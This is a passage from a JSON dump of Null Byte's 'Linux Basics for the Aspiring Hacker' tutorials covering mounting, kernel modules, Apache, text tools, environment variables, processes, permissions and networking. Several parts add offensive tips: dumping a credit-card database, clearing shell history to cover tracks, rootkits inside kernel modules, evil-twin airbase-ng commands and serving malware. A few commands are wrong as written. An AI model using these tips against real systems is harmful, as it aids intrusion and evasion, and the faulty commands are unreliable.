(/tmp)\nSo, to \"dump\" the data from command line we simply type:\n* mysql --tab = /tmp --user root -p creditcardnumbers cardnumbers;\nThis will send the data to the directory we designated, in this case /tmp.\nAs we can see below (after we changed to the /tmp directory and then listed that directory) we have created two files, cardnumbers.sql and cardnumbers.txt. The first, cardnumbers.sql, contains a script to create the table necessary to hold the data and the second, cardnumbers.txt, contains the data.\nNow, we have successfully acquired the key and valuable information from this database, essentially having found the golden fleece of hacking!\nSince MySQL is SO critical to web apps, we will be spending a few tutorials on understanding it, then how to find it and finally how to hack it, so keeps coming back my greenhorn hackers for more adventures in Hackerland.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 13 (Mounting Drives & Devices)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-13-mounting-drives-devices-0149929/",
        "content": "* WonderHowTo\nWelcome back, my aspiring hackers!\nOne of those areas of Linux that Windows users invariably struggle with is the concept of \"mounting\" devices and drives. In the Windows world, drives and devices are automatically \"mounted\" without any user effort or knowledge. Well, maybe a bit of knowledge. Most Windows users know to unmount their flash drive before removing it, but they usually think of it as \"ejecting\" it.\nThe mount command has a history back to the prehistoric days of computing (the 1970s) when computer operators physically mounted tape drives to the the behemoth, gymnasium-sized computers. These tape drives were the storage medium of choice (as hard drives had not been invented yet) and the operator had to tell the machine that they were mounting the tape before it could be read.\nWindows generally auto-mounts drives and devices with the PnP service, so users don't need to think about mounting. Each drive or device then is assigned with a letter mount point such as C:, D:, E:, etc.\nIn more recent distributions of Linux, auto-mount is often enabled as well, but the true Linux admin needs to understand the mount command and the mounting process as they will someday need to mount a device or drive that does not auto-mount. This is true for the everyday ordinary sysadmin in Linux and especially true for the digital forensic investigator and hacker as many times the devices will not be automatically mounted.\nStep 1: File Structure\nRemember, Linux has a single tree structure for its file system (unlike Windows) with a root for every drive and device. This means that all drives and devices are part of a single filesystem tree with / at the top. Any other drives must be \"mounted\" to this tree. We can do this with the mount command.\nWhen we mount a device, we mount it to a directory and it becomes part of the tree. We can mount a device to ANY directory, but when we do so, that directory that we mount our device to is \"covered\" and unavailable to us. This means we can't access any of the files in that directory. It goes without saying—I think—that's not good. That's why we have special, empty directories for mounting devices. These will vary by distribution of Linux, but generally they are /mnt and /media.\nStep 2: Mount Command\nLet's take a look at the mount command. Type in:\nThis brings up the help screen displayed below.\nI have highlighted the crucial part regarding the syntax of the command. Basically, it is:\n* mount -t filesystemtype location\nThis command will \"mount\" a filesystem of the type (-t) at the location specified. So, for instance, we could mount cdrom at the media directory by typing:\n* mount -t /dev/cdrom /media\nThis will mount the cdrom device at the /media directory on the filesystem tree.\nWe also have numerous options we can use when mounting a device including:\n* rw - mount read/write\n* user - permit any user to mount\n* auto/noauto - file system will or will NOT automatically mount\n* exec/noexec - permit or prevent the execution of binaries on the mounted device\nAs always, you can check the man page for mount to learn all the options:\n* man mount\nStep 3: Setting Up Automounting with Fstab\nThe fstab is the \"File system table\". It a system configuration file in Linux. The mount command reads the fstab to determine what options to use when mounting a filesystem. In this way, it defines the options automatically when we mount the device. It simply reads the entry in the fstab table for that device and applies those options defined there.\nAs we can see in the screenshot above, we have simply displayed the contents of fstab with the cat command.\n* cat fstab\nThe fstab table is comprised of six (6) columns. These are:\n1. Device - the UUID\n2. Mount point - the directory where we want to attach the device\n3. Type - the filesystem type such ext2, ext3, swap, ISO9660, etc.\n4. Options - these rw (read/write), auto, nouser, async, suid, etc\n5. Dump - indicates how often to backup the device\n6. Pass - specifies the pass when fsck should check the filesystem\nStep 4: Umount\nWhen want to unmount a drive or device, the command we use is umount (that's right. I didn't spell it wrong. It is umount, not unmount).\nTo unmount our cdrom device that we mounted above, we type:\n* umount /dev/cdrom\nYou can NOT unmount a drive or device that is currently being used by the system.\nKeep coming back to Null Byte, my hacker apprentices, for more tutorials on hacking and the basics of Linux that you need to know to \"Hack Like a Pro.\"\nCover image via University of Auckland",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 12 (Loadable Kernel Modules)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-12-loadable-kernel-modules-0149508/",
        "content": "* WonderHowTo\nWelcome back, my budding hackers!\nIn my continuing series on Linux basics for aspiring hackers, I now want to address Loadable kernel modules (LKMs), which are key to the Linux administrator because they provide us the capability to add functionality to the kernel without having to recompile the kernel. Things like video and other device drivers can now be added to the kernel without shutting down the system, recompiling, and rebooting.\nLoadable kernel modules are critical to the hacker because if we can get the Linux admin to load a new module to their kernel, we not only own their system, but because we are at the kernel level of their operating system, we can control even what their system is reporting to them in terms of processes, ports, services, hard drive space, etc.\nSo, if we can offer the Linux user/admin a \"new and improved\" video driver with our rootkit embedded in it, we can take control of his system and kernel. This is the way some of the most insidious rootkits take advantage of the Linux OS.\nSo, I hope it's clear that understanding LKMs is key to being an effective Linux admin and being a VERY effective and stealthy hacker.\nStep 1: What Is a Kernel Module?\nThe kernel is a core component of any Linux operating system, including our BackTrack System. The kernel is the central nervous system of our operating system, controlling everything an operating system does, including managing the interactions between the hardware components and starting the necessary services. The kernel operates between user applications and the hardware such as the CPU, memory, the hard drive, etc.\nAs the kernel manages all that is taking place with the operating system, sometimes it needs updates. These updates might include new device drivers (such as video card or USB devices), file system drivers, and even system extensions. This is where LKMs come in. We can now simply load and unload kernel modules as we need them without recompiling the kernel.\nStep 2: Checking the Kernel\nThe first thing we want to do is check to see what kernel our system is running. There are at least two ways to do this. We can type:\nNote that the kernel tells us its kernel build (2.6.39.4), but also the architecture it is built for (x86_64). We can also get this info by \"catting\" the /proc/version file, which actually gives up even more info.\n* cat /proc/version\nStep 3: Kernel Tuning with Sysctl\nSometimes, a Linux admin will want to \"tune\" the kernel. This might include changing memory allocations, enabling networking feature, and even hardening the kernel from hackers.\nWith modern Linux kernels, we have the sysctl command to tune kernel options. All changes you make with the sysctl remain in effect only until you reboot the system. To make any changes permanent, the configuration file for sysctl must be edited at /etc/sysctl.conf.\nBe careful in using systctl because without the proper knowledge and experience, you can easily make your system unbootable and unusable. Let's take a look at the contents of sysctl now.\n* sysctl -a |less\nTo view the configuration file for sysctl, we can get it at /etc/sysctl.conf.\n* less /etc/sysctl.conf\nOne of the ways we may want to use sysctl for hacking is to enable ipforwarding (net.ipv4.conf.default.forwarding) for man-in-the-middle attacks. From a hardening perspective, we can disable ICMP echo requests (net.ipv4.icmp_echo_ignore_all) so as to make more difficult, but not impossible, for hackers to find our system.\nStep 4: Kernel Modules\nTo manage our kernels, Linux has at least two ways to do it. The older way is to use a group of commands built around the insmod command. Here we use one of those—lsmod—to list the installed modules in kernel.\nWe can load or insert a module with insmod and remove a module with rmmod.\nStep 5: Modprobe\nMost newer distributions of Linux, including our BackTrack 5v3, have converted to the modprobe command for LKM management. To see what modules are installed in our kernel, we can type:\n* modprobe -l\nTo remove a module, we simply use the -r switch with modprobe.\n* modprobe -r\nA major advantage of modprobe is that understands dependencies, options, and installation and removal procedures for our kernel modules.\nTo see configuration files for the installed modules, we list the contents of the /etc/modprobe.d/ directory.\n* ls -l /etc/modprobe.d/\nRemember, the LKM modules are a convenience to a Linux user/admin, but are a major security weakness of Linux and one the professional hacker should be familiar with. As I said before, the LKM can be the perfect vehicle to get your rootkit into the kernel and wreak havoc!",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 11 (Apache Web Servers)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-11-apache-web-servers-0148695/",
        "content": "* WonderHowTo\nWelcome back, my aspiring hackers!\nIn this series on Linux for aspiring hackers, I'm trying to provide you with the basic skills needed to be capable in Linux as a hacker. One area that's critical that we haven't covered yet is building and managing an Apache web server.\nApache is found on over 60% of the globe's web servers, so any self-respecting Linux admin should be familiar with it. As a hacker aspiring to hack websites, it's critical to understand the inner workings of Apache, websites, and the backend databases of these sites.\nIn addition, by setting up your own web server, you could serve up malware to anyone who visits your site. If you're thinking of building a botnet, this is one of the best ways of doing that (I'll do a tutorial on building a botnet in the near future).\nGetting Apache on Your System\nIf you have BackTrack running on your system, Apache is already installed. Many other Linux distros have it installed by default as well. If you don't have Apache installed, you can download and install the LAMP stack.\nLAMP is an acronym for Linux, Apache, MySQL, PERL, and PHP. These are the most widely used tools for developing websites in the Linux world, and they're very popular in the Microsoft world too, only it's generally referred to as WAMP, where the W simply stands for Windows.\nSimply download this LAMP stack and install it on your system, and then I will take you through the care and feeding of your LAMP stack to serve up webpages. In addition, we'll download and install a website that we can use for web and database hacking in future tutorials.\nStep 1: Start Your Apache Daemon\nThe first step, of course, is to start our Apache daemon. In BackTrack, go the BackTrack -> Services -> HTTPD and click on apache start.\nStep 2: Open the Default Website\nNow that Apache is running, it should be able to serve up its default webpage. Let's type http://localhost/ in your favorite web browser.\nStep 3: Open the Index.html File\nApache's default webpage is /var/www/index.html. We can edit that file and get Apache to serve up whatever webpage we want, so let's create our own.\nUse any text editor you please, including vi, gedit, Kate, KWrite, emacs, etc. For demonstration purposes here, I'll open the /var/www/index.html with KWrite.\nNote here that the default webpage has exactly the text that was displayed when we opened our browser to localhost, but in html format. All we need to do is edit this file to have our web server display the information we want.\nStep 4: Add Some Html\nNow that we have the web server running and the index file open, we can add whatever text we'd like the web server to serve up. We will create some simple html blocks.\nLet's serve up this page:\n<html><body>\n<h1> Null Byte is the Best! </h1>\n<p> If you are new to hacking, wonderhowto.com's Null Byte</p><p>world is the best place to learn hacking!</p>\n</body></html>\nNow, save this file and close KWrite.\nStep 5: Let's See What Happens\nNow that we have saved our /var/www/index.html file, we can check to see what Apache will serve up. Navigate your browser once again to http://localhost.\nApache has served up our webpage just as we created it!\nStep 6: Download & Install DVWA\nNow that we have our web server up and running, we want to download and install a website designed especially for hacking, known as the Damn Vulnerable Web Application or DVWA. Let's download it from here, then unzip it. To unzip it, type:\n* unzip DVWA-1.0.8.zip -d /var/www\nNext, we need to change permissions to give us (root) execute permissions.\n* chmod 755 DVWA-1.0.8\nIn my next Linux tutorial, we will set up PHP, MySQL, and configure our Damn Vulnerable Web Application so that we can practice website and database hacking, so keep coming back!",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 10 (Manipulating Text)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-10-manipulating-text-0148539/",
        "content": "* WonderHowTo\nWelcome back, my aspiring hackers!\nAs mentioned several times in previous Linux tutorials, nearly everything in Linux is a file, and very often they are text files. For instance, all of the configuration files in Linux are text files. To reconfigure an application in Linux, we simply need to open the configuration file, change the text file, re-save, and then restart the application and our reconfiguration is applied.\nWith so many text files, manipulating text becomes crucial in managing Linux and Linux applications. In this tutorial, we'll look at several of the commands and techniques for manipulating text in Linux. For demonstration purposes, we'll use files from the world's best NIDS, Snort.\nStep 1: Cat That File\nAs demonstrated in an earlier tutorial, cat is probably the most basic text display command. Let's cat the Snort config file found in /etc/snort.\n* cat /etc/snort/snort.conf\nAs you can see, the snort.conf is displayed on our screen until it comes to the end of the file. Not the most convenient way to work with this file.\nStep 2: Take the Head\nIf we just want to view the beginning of a file, we can use the head command. This command displays the first 10 lines of a file, by default.\n* head /etc/snort/snort.conf\nIf we want to see more or less than the default 10 lines, we can tell head how many lines we want to see by putting the number of lines we want to see (with the - switch) between the command and the file name.\n* head -30 /etc/snort/snort.conf\nHere we can see that only the first 30 lines of snort.conf are displayed.\nStep 3: Grab That Tail\nSimilar to the head command, we view the last lines of a file by using the tail command. Let's use it on the snort.conf.\n* tail /etc/snort/snort.conf\nNotice that it displays some of the last \"includes\" of the rules files, but not all of them. Let's now see if we can display all the rule \"includes\" by grabbing the last 40 lines of the snort.conf.\n* tail -40 /etc/snort/snort.conf\nNow we can view nearly all the rule includes all on one screen.\nStep 4: Numbering Those Lines\nSometimes—especially with very long files—we may want the file displayed with line numbers. This is probably the case with the snort.conf, as it has 838 lines. This makes it easier to reference changes and come back to the same place within a file. To display a file with line number, we simply type:\n* nl snort.conf\nNote that each line now has a number making referencing much easier.\nStep 5: I Grep That\nAfter cat, grep is probably the most widely used text manipulation command. It's a filtering command; in other words, it enables us to filter the content of a file for display. If for instance, we wanted to see all the instances of where the word \"database\" occurs in our snort.conf file, we could ask cat to only display those lines where it occurs by typing:\n* cat /etc/snort/ snort.conf | grep database\nThis command will first grab the snort.conf and then \"pipe\" it (|) to grep which will take it as input and then look for the occurrences of the word \"database\" and only display those lines. Grep is a powerful and essential command for working in Linux as it can save us hours searching for every occurrence of a word or command.\nStep 6: I Sed That Works\nThe sed command essentially allows us to search for occurrences of a word or text pattern and then do some work on it. The name comes from the concept of a stream editor and is a contraction of those two words. In its most basic form, sed operates like the find and replace function in Windows. Let's search for the word \"mysql\" in the snort.conf file using grep.\n* cat /etc/snort/snort.conf | grep mysql\nWe can see that the grep command found five occurrences of the word mysql.\nLet's say we want sed to replace every occurrence of mysql and with MySQL (remember, Linux is case sensitive) and then save the new file to snort2.conf. We could do this by typing:\n* sed s/mysql/MySQL/g snort.conf > snort2.conf\nThis command says, \"search (s) for the word mysql and replace it with the word MySQL globally (i.e. wherever you find it in the file).\"\nNow, when we grep snort2.conf for mysql, we see that none were found and when we grep for MySQL, we find five occurrences of MySQL.\n* cat /etc/snort/snort.conf | grep MySQL\nIf we just want to replace only the first occurrence of the word mysql, we could leave out the trailing g and it would only replace the first occurrence.\n* sed s/mysql/MySQL/ snort.conf > snort2.conf\nThe sed command can also be used to find and replace any specific occurrence of a word. For instance, if I want to only replace the third occurrence of the word mysql, I can simply place the number of the occurrence at the end of the command and sed will only replace the third occurrence of the word \"mysql\" with \"MySQL\".\n* sed s/mysql/MySQL/3 snort.conf > snort2.conf\nStay Tuned for More\nThat's it for this lesson, but there are many more to come, so check out our section on learning Linux basics to stay up to date. If you have any questions on using sed, cat, head, tail, nl, or grep, ask away in the comments below. You can also visit the Null Byte forum for help on unrelated matters.\nOriginal penguin eye image via Shutterstock",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 9 (Managing Environmental Variables)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-9-managing-environmental-variables-0148268/",
        "content": "* WonderHowTo\nWelcome back, my aspiring hackers!\nOne of the areas that often gives Linux newcomers problems are the environment variables. Although Windows systems have environment variables, most users, and for that matter, most administrators, never manage their environment variables. To get the most from our Linux hacking system, we need to both understand environment variables and be able to manage them for optimal performance.\nEnvironment variables are the variables that are used by our particular user environment. In most cases, this will be our BASH shell. Each user, including root, has a set of environment variables that are set at default values unless they're changed. We can change these values to make our system work more efficiently and tailor our work environment to best meet our individual needs.\nStep 1: View Our Environment Variables\nWe can view our environment variables by typing:\nNotice that set lists for us all of the environment variables, user defined functions, and aliases. Also, make note that our environment variables are always UPPER CASE names such as HOME, PATH, HISTSIZE, etc.\nIf want to see the value inside the variable, we can type:\n* echo $HISTSIZE\nIt's important to notice that when we want to use the value inside the variable, such as here, we need to put a $ before the variable name.\nThe HISTSIZE variable contains the value of the number of commands that are stored in our history file. As you can see in this screenshot, the HISTSIZE variable is set to 1000. In some cases, we may not want our commands stored in the history file, such as when we are covering our tracks, then we can set our HISTSIZE variable to zero.\n* HISTSIZE=0\nWhen we change an environment variable, it's only for that environment. This means that once we close that terminal, any changes that we made to these variables is lost or set back to the default value. If we want the value to remain for our next terminal session and other terminal sessions, we need to export the variable. We can do this by simply typing:\n* export HISTSIZE\nStep 2: Changing Our Terminal Prompt\nLet's have a little fun and change the prompt in our terminal. The environment variable that contains our prompt for the first terminal is PS1. We can change it by typing:\n* PS1= \"World's Best Hacker: #\"\nRemember that our prompt will now be \"World's Best Hacker\" whenever we open the first terminal (PS1), but the second terminal will still be the default BackTrack command prompt. In addition, if we really like this command prompt and want to keep it, we need to export it so that each time we open this terminal, the prompt will be \"World's Best Hacker.\"\n* export PS1\nStep 3: Changing Our Path Variable\nProbably the most important variable in our environment is our PATH variable. This is what controls where our shell looks for the commands we type, such as cd, ls, echo, etc. If it doesn't find the command in one of the directories in our path, it returns an error \"command not found,\" even if it DOES exist in another directory not in our PATH.\nLet's take a look at our path variable:\n* echo =$PATH\nNotice the directories included in our PATH. These are usually the various /bin and /sbin directories where our system variables are found. When we type ls, the system knows to look in each of these directories for the ls command.\nWhenever we want to use aircrack-ng or another hacking application in this PATH variable, we have to first navigate to that directory. In the case of aircrack-ng, that would be /pentest/wireless/aircrack-ng.\nNow, if we want to add our wireless hacking application to our PATH variable, we can type:\n* PATH=$PATH:/pentest/wireless/aircrack-ng\nNow when we want to run aircrack-ng, we don't need to navigate to the pentest/wireless/aircrack-ng directory. We now can execute aircrack-ng applications from anywhere in BackTrack!\nThis can be a very useful technique for directories that we use often, but be careful to not add too many directories to your PATH variable as the system will have to search through every directory in the PATH to find commands and could potentially slow down your terminal and your hacking.\nThat's It for Now...\nStay tuned for more Linux basics for the aspiring hacker. If you haven't checked out the other guides yet, you can find them all right here. If you have any questions, make sure to comment below or start a thread in the Null Byte forum for help.\nCalm penguin and screaming penguin photos via Shutterstock",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 8 (Managing Processes)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-8-managing-processes-0148052/",
        "content": "* WonderHowTo\nWelcome back, my novice hackers!\nIn my continuing effort to develop your Linux skills, I now offer you this eighth in my series for Linux Basics for the Aspiring Hacker. In this tutorial, we'll look at system processes and how to manage them.\nIn Linux, a process is a program running in memory. Typically, your computer is running hundreds of processes simultaneously. If they're system processes, Linux folks refer to them as daemons or demons. You will often see the process name ending with a \"d\" such httpd, the process or daemon responsible for the http service.\nStep 1: See What Processes Are Running\nWe can see all the processes running on your system by typing:\nThese switches will provide all processes (a), the user (u) ,and processes not associated with a terminal (x). This is my favorite set of switches for using ps as it enables me to see which user initiated the process and how much in resources it's using.\nNote that each process listed shows us among many things.\n* %MEM (memory)\nIf we just wanted to see the all the processes with limited information, we can type:\nYou can see all the processes running, but without such information as CPU percentage and memory percentage. Note that airbase-ng is listed with PID 5143 and the last process is the ps command.\nProcess numbers, or PIDs, are critical for working in Linux, as you often need the PID to manage a process. As you might have seen in some of my Metasploit tutorials, the PID often becomes critical in hacking the victim systems.\nStep 2: The Top Command\nSimilar to the ps command is the top command, except that top shows us only the top processes. In other words, it only shows us the processes using the most resources and it's dynamic, meaning that it is gives us a real-time look at our processes. Simply type:\nAs you can see, the processes are listed in the order by how much system resources they are using, and the list is constantly changing as the processes use more or less resources.\nStep 3: Killing Processes\nSometimes we will need to stop processes in Linux. The command we use is kill. Don't worry, it sounds more violent than it actually is. This command is particularly important if we have a process that continues to run and use system resources, even after we have tried to stop it. These processes are often referred to as \"zombie\" processes.\nWe can kill a process by simply typing kill and the process ID or PID. So to kill my airbase-ng process, I can simply type:\n* kill 5143\nWe can see in the screenshot above that my airbase-ng process is no longer running.\nThere are many types of \"kills\". The default kill (when we use the kill command without any switches) is kill 15 or the termination signal. It allows the process to cleanup and gently terminate its process.\nSometimes, processes still refuse to terminate even when sent the default kill command. In that case, we have to get more serious and use the absolute terminator to do the job. This is kill -9, which takes no prisoners and ends the job without allowing it to say its goodbyes and forces the kernel to terminate it immediately.\nStep 4: Change Process Priority\nEvery process in Linux is given a priority number. As you probably guessed, this priority number determines how important the process is and where it stands in line in terms of using system resources. These priority numbers range from 0 to 127 with 0 being the highest priority and 127 being the lowest.\nAs the root user or system admin, we can't directly determine the priority of a process—that is the job of the kernel—but we can hint to the kernel that we would like a process to run with a higher priority. We can do this through the nice command. Nice values range from -20 to +19 with the lower values indicating a higher priority.\nWe can set a processes' nice value by using the nice command, the -n switch, the value of the nice, and then the command we want to run. So, if if we wanted to start our airbase-ng process from our Evil Twin tutorial with the highest priority, we could type:\n* nice -n -20 airbase-ng -a 00:09:5B:6F:64:1E --essid \"Elroy\" -c 11 mon0\nLater on, if we felt that we wanted to reduce the priority of the airbase-ng command, we could renice it. The renice command requires simply the renice command, the priority level, and unlike the nice command, it only takes the process PID, such as:\n* renice 15 5143\nWe can see that by renice-ing the airbase-ng command, we have reduced its priority from -20 (highest) to 15 (relatively low).\nStep 5: Push a Process into the Background\nYou probably noticed in running some of my hack tutorials that when we run a command from the shell terminal, the process will take control of that shell until it is complete. If it's an ongoing process, similar to airbase-ng, it will maintain control of that terminal until we stop it. Until that time, we can't use that shell.\nIf we want to still use that shell, we can send that process into the background and then get control of the shell again. To start a command in the background, we simply need to end the command with the & or ampersand. So, to get airbase-ng to run in the background, we simply type:\n* airbase-ng -a 00:09:5B:6F:64:1E --essid \"Elroy\" -c 11 mon0 &\nIf we want to bring a background job to the foreground, we simply type fg. To send a foreground processes to the background, we can type Control Z to stop it and then and using the bg command with the PID to send it to the background.\nThat's It for Now...\nStay tuned for more Linux basics for the aspiring hacker. If you haven't checked out the other guides yet, make sure to give them a look. If you have any questions, make sure to comment below or start a thread in the Null Byte forum for help.\nPenguins walking and penguin trio photos via Shutterstock",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 7 (Managing Permissions)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-7-managing-permissions-0147792/",
        "content": "* WonderHowTo\nWelcome back, my greenhorn hackers!\nI've been writing these Linux tutorials in an attempt to fill the void in the education of some aspiring hackers into the Linux operating system. There is a lot to know, and in this tutorial, we'll look at Linux file permissions.\nStep 1: Checking Permissions\nWhen we want to find the permissions on a file, we can simply use the ls command with the -l or long switch. Let's use that command in the pentest/wireless/aircrack-ng directory and see what it tells us about the files there.\nIf we look at each line, we can see quite a bit of info on the file including whether it's a file or directory, the permissions on the file, the number of links, the owner of the file, the group owner of the file, the size of the file, when it was created or modified, and finally, the name of the file. Let's examine each of these.\nIdentifying a File or Directory\nThe very first character of the line tells us whether it's a file or directory. If the line begins with a d, it's a directory. If it begins with a -, it's a file.\nIdentifying the Permissions\nThe next section of characters defines the permissions on the file. There are three sets of rwx that stands for read, write and execute. This determines whether there is the permission to read the file, write to the file, or execute the file. Each set of rwx represents the permissions of the owner, group, and then all others.\nSo, if we look at the second line for the ChangeLog file...\nWe can see that it begins with:\n* -rw-r--r--\nThis means that it's a file (-) where the owner has read (r) and write (w) permissions, but not execute permission (-).\nThe next set of permissions represents those of the group. Here we can see that the group has read permissions (r), but not write (-) or execute permission (-).\nFinally, the last set of permissions are for all others. We can see that all others have only the read (r) permission on the ChangeLog file.\nStep 2: Changing Permissions\nLet's imagine a case where we wanted the group to be able to both write and execute the ChangeLog file. Linux has a command called chmod that allows us to change the permissions on a file as long as we're root or the owner of the file. These permissions are represented by their binary equivalents in the operating system.\nThe Numbers\nRemember that everything is simply zeros and ones in the underlying operating system, and these permissions are represented by on and off switches in the system. So, if we could imagine the permissions as three on/off switches and these switches are in the base two-number system, the far right switch represents 1 when it's on, the middle switch represents 2 when it's on, and finally, the far left switch represents 4 when on.\nSo, the three permissions look like this when they are all on:\n* 4 2 1 = 7\nIf you sum these three, you get seven, right? In Linux, when all the permission switches are on, we can represent it with the decimal numerical equivalent of 7. So, if we wanted to represent that the owner (7) and the group (7) and all users (7) had all permissions, we could represent it as:\nNow, lets go back to our ChangeLog file. Remember its permissions? They were rw-r--r--, so we could represent that numerically like:\n* r w - r - - r - -\n* 4 2 0 4 0 0 4 0 0\nThis can be represented by 644.\nChanging the Actual Permissions of ChangeLog\nNow, if we wanted to give the group write (2) and execute (1) privilege, we can use the chmod command to do it. We need to add the write (2) privilege and the execute (1) privilege to the ChangeLog file. We do that by:\n* chmod 7 7 4 ChangeLog\nThis statements says give the owner all permissions (4+2+1=7), the group the same (4+2+1=7). and give everyone else simply read permission (4+0+0=4). When we now do a ls -l, we can see that the permissions for ChangeLog are now:\n* r w x r w x r - -\nSimple, right?\nStep 3: Changing Permissions with UGO\nAlthough the numeric method is probably the most common method for changing permissions in Linux (every self-respecting Linux guru can use it), there's another method that some people are more comfortable with. It's often referred to as the UGO syntax. UGO stands for U=user or owner, G=group and O=others. UGO has three operators:\n* + for add a permission\n* - for subtract a permission\n* = to set a permission\nSo, if I wanted to subtract the write permission to the group that ChangeLog belongs to, I could write:\n* chmod g-w ChangeLog\nThis command says \"for the group (g) subtract (-) the write (w) permission to ChangeLog.\"\nYou can see that when I now check file permissions by typing ls -l, that the ChangeLog file no longer has write permission for the group.\nIf I wanted to give both the user and group execute permission, I could type:\n* chmod u+x, g+x ChangeLog\nThis command says \"for the user add the execute permission, for the group add the execute permission to the file ChangeLog.\"\nStep 4: Giving Ourselves Execute Permission on a New Hacking Tool\nVery often as a hacker, we'll need to download new hacking tools. After we download, extract, unzip, make, and install them, we'll very often need to give ourselves permission to execute it. If we don't, we will usually get a message that we don't have adequate permission to execute.\nWe can see in the screenshot above that our newhackertool does not have execute permission for anyone.\nWe can give ourselves permission to execute on a newhackertool by writing:\n* chmod 766 newhackertool\nAs you now know, this would give us, the owner, all permissions including execute, and the group and everyone else just read and write permissions (4+2=6). You can see in the screenshot above that after running the chmod command, that's exactly what we get!\nIn my next Linux tutorial, we will look at managing running processes, so make sure to come back. If you haven't already, make sure to check out the first six parts of this series, and if you have any questions, ask them in the comments below or in the Null Byte forum.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 6 (Networking Basics)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-6-networking-basics-0147673/",
        "content": "* How everything connects today\nStep 1: Analyzing Networks\nThe most basic linux command for analyzing networks is ifconfig. It's very similar to the Windows command ipconfig. Let's take a look at it.\nAs you can see in this screenshot, ifconfig conveys a significant amount of information to the user. In the very first line, we see to the far left eth0. This is the first wired network connection, ethernet 0 (Linux usually starts counting at 0).\nFollowing this, we see the type of network being used (Ethernet) and the hardware address (this is the globally unique address stamped on every piece of network hardware, in this case the NIC).\nThe second line then contains information of the IP address, in this case, 192.168.1.114, the broadcast address (the address to send out information to all IPs on the subnet), and finally the network mask (this is the info on what part of the IP address is network and which part is hosts). There is a lot more technical info there, but it's beyond the scope of a Linux basics tutorial.\nIf we look down below to what appears to be a second paragraph, we see the start of another paragraph with lo to the far left.\nThis is the loopback address or localhost. This is the address of the machine you're working on if you simply wanted to test something like a website. It generally is represented with the IP address 127.0.0.1.\nStep 2: Changing IP Addresses\nChanging IP addresses can be fairly simple in Linux. Remember that in most cases, you're going to have a dynamically assigned address from a DHCP server. In some cases, you may need to reassign the address, especially if you're hacking. This can be useful in spoofing your IP address, making network forensics more challenging, but certainly not impossible.\nWe can do this by using the ifconfig command with the interface we want to assign the IP to and the IP address we want. Such as:\n* ifconfig eth0 192.168.1.115\nNow, when we type ifconfig, we can see that our IP address has changed to the new IP address.\nWe can also change the netmask and broadcast address, if necessary, such as:\n* ifconfig eth0 192.168.1.115 netmask 255.255.255.0 broadcast 192.168.1.255\nStep 3: DHCP (Dynamic Host Configuration Server)\nLinux has a DHCP server that runs a daeman called dhcpd. It's this DHCP server that assigns IP addresses to all the systems on the subnet. It also keeps logs files of which machines had which IP addresses at which time. It's this log that is often used to trace hackers in a forensic analysis after an attack.\nWhen I want to be assigned a new address from the DHCP server, I can simply call the server with the command dhclient (different Linux distros use different DHCP clients, but BackTrack is built on Ubuntu which uses dhclient), like this:\nAs you can see, the dhclient command sends out DHCPDISCOVER request from the default NIC. It then gets an offer (DHCPOFFER) of 192.168.1.114 from the DHCP server, then confirms the IP assignment to the DHCP server. Now, if we type ifconfig, we can see that the DHCP server has assigned a new IP address.\nStep 4: DNS (Domain Name Service)\nDNS, or Domain Name Services, is the service that enables us to type in a domain name like www.wonderhowto.com, which it then translates to the appropriate IP address. Without it, we would all have to remember thousands of IP addresses of our favorite websites (no small task even for a savant).\nOne of the most useful commands for the aspiring hacker is dig, which is the equivalent of nslookup in Windows, but offers us much more information on the domain. For instance, we digwonderhowto.com and by adding the ns option, it will display the name server for wonderhowto.com.\n* dig wonderhowto.com ns\nBy using the dig command with the mx option, we can get info on WonderHowTo's email servers.\n* dig wonderhowto.com mx\nThe most common Linux DNS server is the Berkeley Internet Name Domain, or BIND. In some cases, Linux users will often refer to DNS as BIND, so don't be confused. DNS or BIND simply maps individual domain names to IP addresses.\nOn our BackTrack system, we can point out DNS services to a local DNS server or a public DNS server. This pointing takes place in the a plain text tile named /etc/resolv.conf file. Let's open it with kwrite:\n* kwrite /etc/resolv.conf\nAs you can see, we are pointing to two public DNS servers to provide us with DNS services. If we want to change our DNS servers or add another server, we can simply add another line to this text file and save it. The next time DNS services are required, the Linux operating system will look to the new DNS server designated in this file.\nSimple, right?\nIn my next Linux tutorial, we will look at security and permissions, so keep coming back. If you haven't already, make sure to check out the first five parts of this series, and if you have any questions, ask away in the comments below or hit up the Null Byte forum for more help.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 5 (Installing New Software)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-5-installing-new-software-0147591/",
